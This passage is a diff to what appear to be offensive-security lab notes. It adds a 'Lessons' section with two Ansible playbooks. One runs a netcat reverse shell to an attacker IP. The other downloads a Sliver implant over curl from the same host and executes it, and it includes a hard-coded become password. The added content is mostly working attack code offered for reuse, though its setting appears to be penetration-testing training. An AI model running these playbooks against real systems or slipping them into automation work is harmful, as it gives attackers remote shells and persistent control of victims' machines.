@@ -1557,3 +1557,44 @@ By implementing these security practices, you can significantly reduce the risk 
 2. **Protect Credentials**: When using tools like Impacket, be cautious with handling and storing credentials and tickets to avoid accidental exposure.
 
 
+
+
+## Lessons:
+
+
+- revshell
+```yaml
+---
+- name: Execute a reverse shell on the target host
+  hosts: linuxvictim
+  tasks:
+    - name: Run reverse shell
+      shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.175 9001 >/tmp/f
+      async: 30
+      poll: 0
+      ignore_errors: yes
+
+```
+
+- download and execute with a large timeout so the shell doesn't die
+```yaml
+- name: Write a file as offsec
+  hosts: all
+  gather_facts: true
+  become: yes
+  become_user: offsec
+  vars:
+    ansible_become_pass: lab
+  tasks:
+    - copy:
+          content: "This is my offsec content"
+          dest: "/home/offsec/written_by_ansible.txt"
+          mode: 0644
+          owner: offsec
+          group: offsec
+    - name: Download and execute sliver shell
+      shell: "cd /dev/shm; curl http://192.168.45.175:8000/BINDING_MAYOR -o shell && chmod +x shell && ./shell"
+      async: 99999999
+      poll: 0
+      ignore_errors: yes
+```
